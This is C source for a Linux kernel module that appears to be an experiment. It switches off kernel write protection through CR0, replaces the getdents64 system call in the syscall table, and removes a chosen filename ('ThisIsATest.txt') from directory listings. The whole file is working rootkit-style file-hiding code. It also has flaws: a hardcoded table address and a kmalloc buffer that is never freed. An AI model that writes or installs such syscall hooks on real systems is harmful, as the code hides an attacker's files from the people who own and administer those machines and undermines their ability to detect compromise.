#include <linux/module.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <stdbool.h>

// Function headers. 
int load(void);
void unload(void);

// Types & other consts.
typedef int (*original_getdents64_t)(const struct pt_regs *regs);
static original_getdents64_t original_getdents64_ptr;
static unsigned long *syscall_table = (unsigned long *)0xffffffffafe001a0; 
static char *file_name_to_hide = "ThisIsATest.txt";
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

int new_getdents64(const struct pt_regs *regs) {
    int total_bytes_read = original_getdents64_ptr(regs);
    struct linux_dirent64 *buff = (struct linux_dirent64*)regs->si;

    // Can be one or more, doesn't really matter so long as it's triggered.
    int has_been_found = 0;
    void *first;

    if (total_bytes_read > 0) {
        first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res = copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
        if (copy_res) {
            printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 * curr = first;

        int i = 0;
        while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
            curr = first + i;

            char *name = curr->d_name;
            if (!strcmp(name, file_name_to_hide)) {
                has_been_found += 1;
                // File matches name to hide, we need to delete it from the array.
                int length_to_copy = total_bytes_read - i - curr->d_reclen;

                // Array has been shortened by the length of the member we've just deleted.
                total_bytes_read -= curr->d_reclen;
                printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
                
                void *next_pos = first + i + curr->d_reclen;
                memmove((void*)curr, (void*)next_pos, length_to_copy);
                continue;
            }

            i += curr->d_reclen;
        }
    }

    if (has_been_found) {
        copy_to_user((void*)buff, (void*)first, total_bytes_read);
    }

    return total_bytes_read;
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (long unsigned int)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_getdents64] = (long unsigned int)original_getdents64_ptr;  
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");